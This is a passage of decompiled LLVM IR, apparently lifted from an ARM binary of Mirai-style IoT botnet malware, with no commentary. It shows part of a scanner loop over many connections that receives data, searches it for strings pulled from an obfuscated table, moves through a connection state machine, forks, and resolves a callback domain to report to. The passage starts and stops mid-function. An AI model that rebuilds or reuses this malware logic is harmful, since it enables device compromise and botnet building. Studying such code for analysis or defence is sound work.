  %v9_f634 = icmp eq i32 %v0_f634, %v3_f614
  store i1 %v9_f634, i1* %cpsr_z.global-to-local, align 1
  %v5_f638 = icmp slt i32 %v0_f634, %v3_f614
  br i1 %v5_f638, label %bb417, label %bb418

bb417:                                            ; preds = %dec_label_pc_f614
  store i32 %v3_f614, i32* @r5, align 4
  br label %bb418

bb418:                                            ; preds = %dec_label_pc_f614, %bb417
  store i32 %v8_f630, i32* %v2_f628, align 4
  br label %bb410

dec_label_pc_f644:                                ; preds = %bb410
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_f650 = load i32, i32* @r6, align 4
  %v1_f650 = load i32, i32* @r5, align 4
  %v3_f650 = icmp uge i32 %v0_f650, %v1_f650
  store i1 %v3_f650, i1* %cpsr_c.global-to-local, align 1
  %v9_f650 = icmp eq i32 %v0_f650, %v1_f650
  store i1 %v9_f650, i1* %cpsr_z.global-to-local, align 1
  %v5_f654 = icmp slt i32 %v0_f650, %v1_f650
  %storemerge157 = select i1 %v5_f654, i32 %v1_f650, i32 %v0_f650
  store i32 %v2_f668, i32* %ip.global-to-local, align 4
  store i32 %v2_f66c, i32* %r1.global-to-local, align 4
  store i32 %v2_f670, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f678 = add i32 %storemerge157, 1
  %v5_f684 = call i32 @__libc_select(i32 %v1_f678, i32 %v2_f66c, i32 %v2_f670, i32 0, i32 %v2_f668)
  %v0_f688 = load i32, i32* @r4, align 4
  %v1_f68c = inttoptr i32 %v0_f688 to i32*
  %v2_f68c = call i32 @__GI_time(i32* %v1_f68c)
  store i32 ptrtoint (i32* @global_var_224b8.142 to i32), i32* @lr, align 4
  %v0_f694 = load i32, i32* @r4, align 4
  store i32 %v0_f694, i32* %stack_var_-52, align 4
  store i32 %v2_f68c, i32* @global_var_224b8.142, align 4
  br label %dec_label_pc_f69c

dec_label_pc_f69c:                                ; preds = %dec_label_pc_f810, %dec_label_pc_f644
  %v1_f6a8 = phi i32 [ %v1_f814, %dec_label_pc_f810 ], [ %v0_f694, %dec_label_pc_f644 ]
  store i32 ptrtoint (i32* @global_var_24f9c.153 to i32), i32* %r1.global-to-local, align 4
  %v2_f6ac = load i32, i32* @global_var_24f9c.153, align 4
  store i32 %v2_f6ac, i32* %r2.global-to-local, align 4
  %v3_f6b0 = mul i32 %v1_f6a8, 388
  store i32 %v3_f6b0, i32* %r3.global-to-local, align 4
  %v2_f6b4 = add i32 %v2_f6ac, %v3_f6b0
  store i32 %v2_f6b4, i32* @r6, align 4
  %v1_f6b8 = add i32 %v2_f6b4, 4
  %v2_f6b8 = inttoptr i32 %v1_f6b8 to i32*
  %v3_f6b8 = load i32, i32* %v2_f6b8, align 4
  %v2_f6bc = icmp eq i32 %v3_f6b8, -1
  store i1 %v2_f6bc, i1* %cpsr_c.global-to-local, align 1
  %v7_f6bc = icmp eq i32 %v3_f6b8, -1
  store i1 %v7_f6bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6bc, label %dec_label_pc_f810, label %dec_label_pc_f6c4

dec_label_pc_f6c4:                                ; preds = %dec_label_pc_f69c
  %v3_f6c4 = udiv i32 %v3_f6b8, 32
  store i32 %v2_f620, i32* %r3.global-to-local, align 4
  %v3_f6cc = mul nuw nsw i32 %v3_f6c4, 4
  store i32 %v3_f6cc, i32* @ip, align 4
  %v2_f6d0 = add i32 %v3_f6cc, %v2_f620
  store i32 %v2_f6d0, i32* %r2.global-to-local, align 4
  %v1_f6d4 = add i32 %v2_f6d0, -312
  %v2_f6d4 = inttoptr i32 %v1_f6d4 to i32*
  %v3_f6d4 = load i32, i32* %v2_f6d4, align 4
  %v1_f6d8 = urem i32 %v3_f6b8, 32
  store i32 %v1_f6d8, i32* %r1.global-to-local, align 4
  %v2_f6dc = add nsw i32 %v1_f6d8, -1
  %v3_f6dc = shl i32 1, %v2_f6dc
  %v4_f6dc = and i32 %v3_f6d4, %v3_f6dc
  %v5_f6dc = icmp ne i32 %v4_f6dc, 0
  store i1 %v5_f6dc, i1* %cpsr_c.global-to-local, align 1
  %v6_f6dc = ashr i32 %v3_f6d4, %v1_f6d8
  store i32 %v6_f6dc, i32* %r3.global-to-local, align 4
  %v1_f6e0 = urem i32 %v6_f6dc, 2
  %v2_f6e0 = icmp eq i32 %v1_f6e0, 0
  store i1 %v2_f6e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6e0, label %dec_label_pc_f6e8, label %dec_label_pc_1025c

dec_label_pc_f6e8:                                ; preds = %dec_label_pc_f6c4, %dec_label_pc_10300
  %v1_f6f4 = phi i32 [ %v1_f6d8, %dec_label_pc_f6c4 ], [ %v1_f6f4.pre, %dec_label_pc_10300 ]
  %v0_f6ec = phi i32 [ %v3_f6cc, %dec_label_pc_f6c4 ], [ %v0_f6ec.pre, %dec_label_pc_10300 ]
  store i32 %v2_f620, i32* @lr, align 4
  %v2_f6ec = add i32 %v0_f6ec, %v2_f620
  store i32 %v2_f6ec, i32* %r2.global-to-local, align 4
  %v1_f6f0 = add i32 %v2_f6ec, -184
  %v2_f6f0 = inttoptr i32 %v1_f6f0 to i32*
  %v3_f6f0 = load i32, i32* %v2_f6f0, align 4
  %v2_f6f4 = add i32 %v1_f6f4, -1
  %v3_f6f4 = shl i32 1, %v2_f6f4
  %v4_f6f4 = and i32 %v3_f6f0, %v3_f6f4
  %v5_f6f4 = icmp ne i32 %v4_f6f4, 0
  store i1 %v5_f6f4, i1* %cpsr_c.global-to-local, align 1
  %v6_f6f4 = ashr i32 %v3_f6f0, %v1_f6f4
  store i32 %v6_f6f4, i32* %r3.global-to-local, align 4
  %v1_f6f8 = urem i32 %v6_f6f4, 2
  %v2_f6f8 = icmp eq i32 %v1_f6f8, 0
  store i1 %v2_f6f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6f8, label %dec_label_pc_f810, label %dec_label_pc_f700.preheader

dec_label_pc_f700.preheader:                      ; preds = %dec_label_pc_f6e8
  %v0_f700182 = load i32, i32* @r6, align 4
  %v1_f700183 = add i32 %v0_f700182, 12
  %v2_f700184 = inttoptr i32 %v1_f700183 to i32*
  %v3_f700185 = load i32, i32* %v2_f700184, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f704181187 = icmp eq i32 %v3_f700185, 0
  store i1 %v2_f704181187, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f704181187, label %dec_label_pc_f810, label %dec_label_pc_f70c.lr.ph

dec_label_pc_f700.loopexit:                       ; preds = %dec_label_pc_f860, %dec_label_pc_f94c
  %v0_f700 = load i32, i32* @r6, align 4
  %v1_f700 = add i32 %v0_f700, 12
  %v2_f700 = inttoptr i32 %v1_f700 to i32*
  %v3_f700 = load i32, i32* %v2_f700, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f704181 = icmp eq i32 %v3_f700, 0
  store i1 %v2_f704181, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f704181, label %dec_label_pc_f810, label %dec_label_pc_f70c.lr.ph

dec_label_pc_f70c.lr.ph:                          ; preds = %dec_label_pc_f700.preheader, %dec_label_pc_f700.loopexit
  %v0_f70c231 = phi i32 [ %v0_f700, %dec_label_pc_f700.loopexit ], [ %v0_f700182, %dec_label_pc_f700.preheader ]
  br label %dec_label_pc_f70c

dec_label_pc_f70c:                                ; preds = %dec_label_pc_f704.backedge.thread, %dec_label_pc_f704.backedge, %dec_label_pc_f704.backedge.thread564, %dec_label_pc_f70c.lr.ph
  %v0_10228 = phi i32 [ %v0_f70c231, %dec_label_pc_f70c.lr.ph ], [ %v0_f70c228, %dec_label_pc_f704.backedge ], [ %v0_f784, %dec_label_pc_f704.backedge.thread ], [ %v0_f784, %dec_label_pc_f704.backedge.thread564 ]
  %v1_f70c = add i32 %v0_10228, 24
  %v2_f70c = inttoptr i32 %v1_f70c to i32*
  %v3_f70c = load i32, i32* %v2_f70c, align 4
  store i32 %v3_f70c, i32* @r3, align 4
  %v2_f710 = icmp ugt i32 %v3_f70c, 355
  store i1 %v2_f710, i1* %cpsr_c.global-to-local, align 1
  %v7_f710 = icmp eq i32 %v3_f70c, 356
  store i1 %v7_f710, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_10228, 28
  store i32 %.pre, i32* @fp, align 4
  br i1 %v7_f710, label %dec_label_pc_10228, label %dec_label_pc_f71c

dec_label_pc_f71c:                                ; preds = %dec_label_pc_f70c, %dec_label_pc_10228
  store i32 %v0_f320, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %v2_f33c, align 4
  %v0_f728 = load i32, i32* @r6, align 4
  %v1_f728 = add i32 %v0_f728, 24
  %v2_f728 = inttoptr i32 %v1_f728 to i32*
  %v3_f728 = load i32, i32* %v2_f728, align 4
  store i32 %v3_f728, i32* %r2.global-to-local, align 4
  %v0_f72c = load i32, i32* @fp, align 4
  %v2_f72c = add i32 %v0_f72c, %v3_f728
  store i32 %v2_f72c, i32* @r4, align 4
  %v1_f730 = add i32 %v0_f728, 4
  %v2_f730 = inttoptr i32 %v1_f730 to i32*
  %v3_f730 = load i32, i32* %v2_f730, align 4
  %v1_f734 = sub i32 356, %v3_f728
  store i32 %v1_f734, i32* %r2.global-to-local, align 4
  store i32 %v2_f72c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f740 = call i32 @__libc_recv(i32 %v3_f730, i32 %v2_f72c, i32 %v1_f734, i32 16384)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f744 = icmp eq i32 %v4_f740, 0
  store i1 %v2_f744, i1* %cpsr_z.global-to-local, align 1
  %tmp419 = icmp slt i32 %v4_f740, 1
  br i1 %tmp419, label %dec_label_pc_f7bc, label %dec_label_pc_f74c

dec_label_pc_f74c:                                ; preds = %dec_label_pc_f71c
  %v0_f74c = load i32, i32* @r5, align 4
  store i32 %v0_f74c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f750

dec_label_pc_f750:                                ; preds = %.thread83, %dec_label_pc_f74c
  %v3_f75c = phi i32 [ %v1_f760, %.thread83 ], [ %v0_f74c, %dec_label_pc_f74c ]
  %v1_f750 = load i32, i32* @r4, align 4
  %v2_f750 = add i32 %v1_f750, %v3_f75c
  %v3_f750 = inttoptr i32 %v2_f750 to i8*
  %v4_f750 = load i8, i8* %v3_f750, align 1
  %v6_f750 = zext i8 %v4_f750 to i32
  store i32 %v6_f750, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f754 = icmp eq i8 %v4_f750, 0
  store i1 %v2_f754, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f754, label %bb420, label %.thread83

bb420:                                            ; preds = %dec_label_pc_f750
  %v2_f758 = add nuw nsw i32 %v6_f750, 65
  store i32 %v2_f758, i32* %r3.global-to-local, align 4
  %v2_f75c = trunc i32 %v2_f758 to i8
  store i8 %v2_f75c, i8* %v3_f750, align 1
  %v0_f760.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread83

.thread83:                                        ; preds = %dec_label_pc_f750, %bb420
  %v0_f760 = phi i32 [ %v3_f75c, %dec_label_pc_f750 ], [ %v0_f760.pre, %bb420 ]
  %v1_f760 = add i32 %v0_f760, 1
  store i32 %v1_f760, i32* %r2.global-to-local, align 4
  %v3_f764 = icmp uge i32 %v1_f760, %v4_f740
  store i1 %v3_f764, i1* %cpsr_c.global-to-local, align 1
  %v9_f764 = icmp eq i32 %v1_f760, %v4_f740
  store i1 %v9_f764, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f764, label %dec_label_pc_f76c, label %dec_label_pc_f750

dec_label_pc_f76c:                                ; preds = %.thread83, %dec_label_pc_f7c0
  store i32 ptrtoint (i32* @global_var_224b8.142 to i32), i32* @lr, align 4
  %v0_f770 = load i32, i32* @r6, align 4
  %v1_f770 = add i32 %v0_f770, 24
  %v2_f770 = inttoptr i32 %v1_f770 to i32*
  %v3_f770 = load i32, i32* %v2_f770, align 4
  %v2_f774 = load i32, i32* @global_var_224b8.142, align 4
  store i32 %v2_f774, i32* %r2.global-to-local, align 4
  %v2_f778 = add i32 %v3_f770, %v4_f740
  store i32 %v2_f778, i32* %r3.global-to-local, align 4
  store i32 %v2_f778, i32* %v2_f770, align 4
  %v0_f780 = load i32, i32* %r2.global-to-local, align 4
  %v1_f780 = load i32, i32* @r6, align 4
  %v2_f780 = add i32 %v1_f780, 8
  %v3_f780 = inttoptr i32 %v2_f780 to i32*
  store i32 %v0_f780, i32* %v3_f780, align 4
  br label %dec_label_pc_f784

dec_label_pc_f784:                                ; preds = %dec_label_pc_f954, %dec_label_pc_f76c
  %v0_f784 = load i32, i32* @r6, align 4
  %v1_f784 = add i32 %v0_f784, 12
  %v2_f784 = inttoptr i32 %v1_f784 to i32*
  %v3_f784 = load i32, i32* %v2_f784, align 4
  %v1_f788 = add i32 %v3_f784, -2
  store i32 %v1_f788, i32* @r3, align 4
  %v7_f78c = icmp eq i32 %v1_f788, 8
  store i1 %v7_f78c, i1* %cpsr_z.global-to-local, align 1
  %v5_f790 = and i32 %v1_f788, 1073741824
  %v6_f790 = icmp ne i32 %v5_f790, 0
  store i1 %v6_f790, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_f784, label %dec_label_pc_f704.backedge [
    i32 2, label %dec_label_pc_fa50
    i32 3, label %dec_label_pc_ffd0
    i32 4, label %dec_label_pc_fe10
    i32 5, label %dec_label_pc_fbf4
    i32 6, label %dec_label_pc_fb20
    i32 7, label %dec_label_pc_fefc
    i32 8, label %dec_label_pc_fcc8
    i32 9, label %dec_label_pc_f97c
    i32 10, label %dec_label_pc_f828
  ]

dec_label_pc_f7bc:                                ; preds = %dec_label_pc_f71c
  br i1 %v2_f744, label %dec_label_pc_1048c, label %dec_label_pc_f7c0

dec_label_pc_f7c0:                                ; preds = %dec_label_pc_f7bc
  %v3_f7c0 = icmp eq i32 %v4_f740, -1
  store i1 %v3_f7c0, i1* %cpsr_c.global-to-local, align 1
  %v8_f7c0 = icmp eq i32 %v4_f740, -1
  store i1 %v8_f7c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f7c0, label %dec_label_pc_f7c8, label %dec_label_pc_f76c

dec_label_pc_f7c8:                                ; preds = %dec_label_pc_f7c0
  store i32 %v0_f320, i32* %ip.global-to-local, align 4
  %v2_f7cc = load i32, i32* %v2_f33c, align 4
  store i32 %v2_f7cc, i32* %r3.global-to-local, align 4
  %v2_f7d0 = icmp ugt i32 %v2_f7cc, 10
  store i1 %v2_f7d0, i1* %cpsr_c.global-to-local, align 1
  %v7_f7d0 = icmp eq i32 %v2_f7cc, 11
  store i1 %v7_f7d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7d0, label %dec_label_pc_f810, label %dec_label_pc_f7d8

dec_label_pc_f7d8:                                ; preds = %dec_label_pc_f7c8, %dec_label_pc_1048c
  %v0_f7d8 = load i32, i32* @r6, align 4
  %v1_f7d8 = add i32 %v0_f7d8, 4
  %v2_f7d8 = inttoptr i32 %v1_f7d8 to i32*
  %v3_f7d8 = load i32, i32* %v2_f7d8, align 4
  %v1_f7dc = call i32 @__GI___libc_close(i32 %v3_f7d8)
  %v0_f7e0 = load i32, i32* @r6, align 4
  %v1_f7e0 = add i32 %v0_f7e0, 384
  %v2_f7e0 = inttoptr i32 %v1_f7e0 to i8*
  %v3_f7e0 = load i8, i8* %v2_f7e0, align 1
  %v4_f7e0 = zext i8 %v3_f7e0 to i32
  %v1_f7e4 = add nuw nsw i32 %v4_f7e0, 1
  %v1_f7e8 = urem i32 %v1_f7e4, 256
  store i32 %v1_f7e8, i32* %r3.global-to-local, align 4
  %v2_f7ec = icmp ugt i32 %v1_f7e8, 8
  store i1 %v2_f7ec, i1* %cpsr_c.global-to-local, align 1
  %v7_f7ec = icmp eq i32 %v1_f7e8, 9
  store i1 %v7_f7ec, i1* %cpsr_z.global-to-local, align 1
  %v1_f7f0 = trunc i32 %v1_f7e4 to i8
  store i8 %v1_f7f0, i8* %v2_f7e0, align 1
  store i32 -1, i32* %r2.global-to-local, align 4
  %v0_f7f8 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_f7f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_f7f8 = xor i1 %v1_f7f8, true
  %v3_f7f8 = and i1 %v0_f7f8, %v2_f7f8
  br i1 %v3_f7f8, label %bb421, label %.thread312

.thread312:                                       ; preds = %dec_label_pc_f7d8
  %v1_f7fc308313 = load i32, i32* @r6, align 4
  %v2_f7fc309314 = add i32 %v1_f7fc308313, 4
  %v3_f7fc310315 = inttoptr i32 %v2_f7fc309314 to i32*
  store i32 -1, i32* %v3_f7fc310315, align 4
  br label %bb422

bb421:                                            ; preds = %dec_label_pc_f7d8
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f7fc304 = load i32, i32* @r6, align 4
  %v2_f7fc305 = add i32 %v1_f7fc304, 4
  %v3_f7fc306 = inttoptr i32 %v2_f7fc305 to i32*
  store i32 -1, i32* %v3_f7fc306, align 4
  %v4_f800 = load i32, i32* %r3.global-to-local, align 4
  %v5_f800 = load i32, i32* @r6, align 4
  %v6_f800 = add i32 %v5_f800, 12
  %v7_f800 = inttoptr i32 %v6_f800 to i32*
  store i32 %v4_f800, i32* %v7_f800, align 4
  %v4_f804 = load i32, i32* %r3.global-to-local, align 4
  %v5_f804 = trunc i32 %v4_f804 to i8
  %v6_f804 = load i32, i32* @r6, align 4
  %v7_f804 = add i32 %v6_f804, 384
  %v8_f804 = inttoptr i32 %v7_f804 to i8*
  store i8 %v5_f804, i8* %v8_f804, align 1
  %v0_f808.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f808.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb422

bb422:                                            ; preds = %.thread312, %bb421
  %v1_f80c = phi i1 [ %v1_f808.pre, %bb421 ], [ %v0_f7f8, %.thread312 ]
  %v0_f80c = phi i1 [ %v0_f808.pre, %bb421 ], [ %v1_f7f8, %.thread312 ]
  %v2_f808 = xor i1 %v1_f80c, true
  %v3_f808 = or i1 %v0_f80c, %v2_f808
  br i1 %v3_f808, label %bb423, label %bb424

bb423:                                            ; preds = %bb422
  br label %bb424

bb424:                                            ; preds = %bb422, %bb423
  store i32 63504, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_f808, i32 ptrtoint (i32* @global_var_eaec.205 to i32))
  br label %dec_label_pc_f810

dec_label_pc_f810:                                ; preds = %dec_label_pc_f700.loopexit, %dec_label_pc_f704.backedge, %dec_label_pc_f700.preheader, %dec_label_pc_f7c8, %dec_label_pc_f6e8, %dec_label_pc_f69c, %dec_label_pc_10320, %bb424
  %v3_f810 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f810, i32* %r3.global-to-local, align 4
  %v1_f814 = add i32 %v3_f810, 1
  store i32 %v1_f814, i32* @r4, align 4
  %v3_f818 = icmp ugt i32 %v1_f814, 355
  store i1 %v3_f818, i1* %cpsr_c.global-to-local, align 1
  %v8_f818 = icmp eq i32 %v1_f814, 356
  store i1 %v8_f818, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f814, i32* %stack_var_-52, align 4
  %v5_f820 = icmp slt i32 %v1_f814, 356
  br i1 %v5_f820, label %dec_label_pc_f69c, label %dec_label_pc_f00c

dec_label_pc_f828:                                ; preds = %dec_label_pc_f784
  %v1_f82c = call i32 @table_unlock_val(i32 12)
  store i32 %v2_10060, i32* %r1.global-to-local, align 4
  %v3_f83c = call i32 @table_retrieve_val(i32 12, i32* nonnull %stack_var_-60)
  %v3_f840 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f83c, i32* %r2.global-to-local, align 4
  %v1_f848 = add i32 %v3_f840, -1
  store i32 %v1_f848, i32* %r3.global-to-local, align 4
  %v0_f84c = load i32, i32* @fp, align 4
  %v0_f850 = load i32, i32* @r6, align 4
  %v1_f850 = add i32 %v0_f850, 24
  %v2_f850 = inttoptr i32 %v1_f850 to i32*
  %v3_f850 = load i32, i32* %v2_f850, align 4
  store i32 %v3_f850, i32* %r1.global-to-local, align 4
  %v4_f854 = call i32 @util_memsearch(i32 %v0_f84c, i32 %v3_f850, i32 %v3_f83c, i32 %v1_f848)
  %v3_f858 = icmp eq i32 %v4_f854, -1
  store i1 %v3_f858, i1* %cpsr_c.global-to-local, align 1
  %v8_f858 = icmp eq i32 %v4_f854, -1
  store i1 %v8_f858, i1* %cpsr_z.global-to-local, align 1
  %v1_f864 = call i32 @table_lock_val(i32 12)
  br i1 %v3_f858, label %dec_label_pc_f860, label %dec_label_pc_101c0

dec_label_pc_f860:                                ; preds = %dec_label_pc_f828
  %v1_f86c = call i32 @table_unlock_val(i32 11)
  store i32 %v2_10060, i32* %r1.global-to-local, align 4
  %v3_f87c = call i32 @table_retrieve_val(i32 11, i32* nonnull %stack_var_-60)
  %v3_f880 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f87c, i32* %r2.global-to-local, align 4
  %v1_f888 = add i32 %v3_f880, -1
  store i32 %v1_f888, i32* %r3.global-to-local, align 4
  %v0_f88c = load i32, i32* @r6, align 4
  %v1_f88c = add i32 %v0_f88c, 24
  %v2_f88c = inttoptr i32 %v1_f88c to i32*
  %v3_f88c = load i32, i32* %v2_f88c, align 4
  store i32 %v3_f88c, i32* %r1.global-to-local, align 4
  %v0_f890 = load i32, i32* @fp, align 4
  %v4_f894 = call i32 @util_memsearch(i32 %v0_f890, i32 %v3_f88c, i32 %v3_f87c, i32 %v1_f888)
  store i32 %v4_f894, i32* @r7, align 4
  %v1_f8a0 = call i32 @table_lock_val(i32 11)
  %v0_f8a4 = load i32, i32* @r7, align 4
  %v2_f8a4 = icmp eq i32 %v0_f8a4, -1
  store i1 %v2_f8a4, i1* %cpsr_c.global-to-local, align 1
  %v7_f8a4 = icmp eq i32 %v0_f8a4, -1
  store i1 %v7_f8a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8a4, label %dec_label_pc_f700.loopexit, label %dec_label_pc_f8ac

dec_label_pc_f8ac:                                ; preds = %dec_label_pc_f860
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f8ac = icmp eq i32 %v0_f8a4, 0
  store i1 %v2_f8ac, i1* %cpsr_z.global-to-local, align 1
  %tmp425 = icmp slt i32 %v0_f8a4, 1
  br i1 %tmp425, label %dec_label_pc_f94c, label %dec_label_pc_f8b4

dec_label_pc_f8b4:                                ; preds = %dec_label_pc_f8ac
  %v0_f8b4 = load i32, i32* @r6, align 4
  %v1_f8b4 = add i32 %v0_f8b4, 20
  %v2_f8b4 = inttoptr i32 %v1_f8b4 to i16*
  %v3_f8b4 = load i16, i16* %v2_f8b4, align 2
  %v4_f8b4 = zext i16 %v3_f8b4 to i32
  store i32 %v4_f8b4, i32* %r3.global-to-local, align 4
  %v1_f8b8 = add i32 %v0_f8b4, 16
  %v2_f8b8 = inttoptr i32 %v1_f8b8 to i32*
  %v3_f8b8 = load i32, i32* %v2_f8b8, align 4
  store i32 %v3_f8b8, i32* %r2.global-to-local, align 4
  store i32 %v2_f8bc, i32* %r1.global-to-local, align 4
  store i32 %v4_f8b4, i32* %stack_var_-42, align 4
  store i32 %v3_f8b8, i32* %stack_var_-60, align 4
  %v1_f8c8 = inttoptr i32 %v0_f8b4 to i32*
  %v2_f8c8 = load i32, i32* %v1_f8c8, align 4
  store i32 %v2_f8c8, i32* @sb, align 4
  %v0_f8cc = call i32 @__libc_fork()
  %v7_f8d0 = icmp eq i32 %v0_f8cc, -1
  %.464 = zext i1 %v7_f8d0 to i32
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f8dc = icmp eq i32 %v0_f8cc, 0
  store i1 %v2_f8dc, i1* %cpsr_z.global-to-local, align 1
  %tmp428 = icmp slt i32 %v0_f8cc, 1
  br i1 %tmp428, label %bb429, label %.thread86

.thread86:                                        ; preds = %dec_label_pc_f8b4
  store i32 1, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f934

bb429:                                            ; preds = %dec_label_pc_f8b4
  store i32 %.464, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f8e8 = icmp eq i1 %v7_f8d0, false
  store i1 %v2_f8e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f8e8, label %dec_label_pc_f8f0, label %dec_label_pc_f934

dec_label_pc_f8f0:                                ; preds = %bb429
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_f8fc = call i32 @socket(i32 2, i32 1, i32 0)
  %v2_f900 = icmp eq i32 %v3_f8fc, -1
  store i1 %v2_f900, i1* %cpsr_c.global-to-local, align 1
  %v7_f900 = icmp eq i32 %v3_f8fc, -1
  store i1 %v7_f900, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_f8fc, i32* @r8, align 4
  br i1 %v7_f900, label %dec_label_pc_1045c, label %dec_label_pc_f90c

dec_label_pc_f90c:                                ; preds = %dec_label_pc_f8f0
  %v1_f910 = call i32 @table_unlock_val(i32 3)
  %v1_f918 = call i32 @table_unlock_val(i32 4)
  %v0_f91c = load i32, i32* @sl, align 4
  store i32 %v0_f91c, i32* %r1.global-to-local, align 4
  %v2_f924 = inttoptr i32 %v0_f91c to i32*
  %v3_f924 = call i32 @table_retrieve_val(i32 3, i32* %v2_f924)
  %v1_f928 = call i32 @resolv_lookup(i32 %v3_f924)
  store i32 %v1_f928, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_f92c = icmp eq i32 %v1_f928, 0
  store i1 %v3_f92c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f92c, label %dec_label_pc_f934, label %dec_label_pc_1033c

dec_label_pc_f934:                                ; preds = %.thread86, %dec_label_pc_f90c, %bb429
  %v0_f934 = load i32, i32* @r6, align 4
  %v1_f934 = add i32 %v0_f934, 4
  %v2_f934 = inttoptr i32 %v1_f934 to i32*
  %v3_f934 = load i32, i32* %v2_f934, align 4
  %v1_f938 = call i32 @__GI___libc_close(i32 %v3_f934)
  store i32 -1, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_f944 = load i32, i32* @r6, align 4
  %v2_f944 = add i32 %v1_f944, 4
  %v3_f944 = inttoptr i32 %v2_f944 to i32*
  store i32 -1, i32* %v3_f944, align 4
  %v0_f948 = load i32, i32* %r2.global-to-local, align 4
  %v1_f948 = load i32, i32* @r6, align 4
  %v2_f948 = add i32 %v1_f948, 12
  %v3_f948 = inttoptr i32 %v2_f948 to i32*
  store i32 %v0_f948, i32* %v3_f948, align 4
  br label %dec_label_pc_f94c

dec_label_pc_f94c:                                ; preds = %dec_label_pc_fb10, %bb438, %dec_label_pc_100d4, %dec_label_pc_f8ac, %dec_label_pc_10178, %dec_label_pc_fec4, %dec_label_pc_f934
  %v0_f94c = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f94c = icmp eq i32 %v0_f94c, 0
  store i1 %v2_f94c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f94c, label %dec_label_pc_f700.loopexit, label %dec_label_pc_f954

dec_label_pc_f954:                                ; preds = %dec_label_pc_f94c, %dec_label_pc_ff78, %dec_label_pc_fdb8, %dec_label_pc_fc70, %dec_label_pc_fb9c, %dec_label_pc_f9f8, %dec_label_pc_1024c, %dec_label_pc_101f0
  %v0_f954 = load i32, i32* @r6, align 4
  %v1_f954 = add i32 %v0_f954, 24
  %v2_f954 = inttoptr i32 %v1_f954 to i32*
  %v3_f954 = load i32, i32* %v2_f954, align 4
  %v0_f958 = load i32, i32* @r7, align 4
  %v2_f958 = sub i32 %v0_f958, %v3_f954
  %v3_f958 = icmp uge i32 %v0_f958, %v3_f954
  store i1 %v3_f958, i1* %cpsr_c.global-to-local, align 1
  %v4_f958 = xor i32 %v0_f958, %v3_f954
  %v5_f958 = xor i32 %v2_f958, %v0_f958
  %v6_f958 = and i32 %v5_f958, %v4_f958
  %v7_f958 = icmp slt i32 %v6_f958, 0
  %v8_f958 = icmp slt i32 %v2_f958, 0
  %v9_f958 = icmp eq i32 %v0_f958, %v3_f954
  store i1 %v9_f958, i1* %cpsr_z.global-to-local, align 1
  %v2_f95c = xor i1 %v8_f958, %v7_f958
  %v0_f958.v3_f954 = select i1 %v2_f95c, i32 %v0_f958, i32 %v3_f954
  store i32 %v0_f958.v3_f954, i32* %r1.global-to-local, align 4
  %v2_f964 = sub i32 %v3_f954, %v0_f958.v3_f954
  store i32 %v2_f964, i32* @r2, align 4
  store i32 %v2_f964, i32* %v2_f954, align 4
  %v0_f96c = load i32, i32* @fp, align 4
  %v1_f96c = load i32, i32* %r1.global-to-local, align 4
  %v2_f96c = add i32 %v1_f96c, %v0_f96c
  store i32 %v2_f96c, i32* @r1, align 4
  store i32 %v0_f96c, i32* @r0, align 4
  %v3_f974 = call i32 @memmove(i32 %v0_f96c, i32 %v2_f96c, i32 %v2_f964)
  br label %dec_label_pc_f784

dec_label_pc_f97c:                                ; preds = %dec_label_pc_f784
  %v1_f97c = add i32 %v0_f784, 24
  %v2_f97c = inttoptr i32 %v1_f97c to i32*
  %v3_f97c = load i32, i32* %v2_f97c, align 4
  store i32 %v3_f97c, i32* %r2.global-to-local, align 4
  %v1_f980 = add i32 %v3_f97c, -1
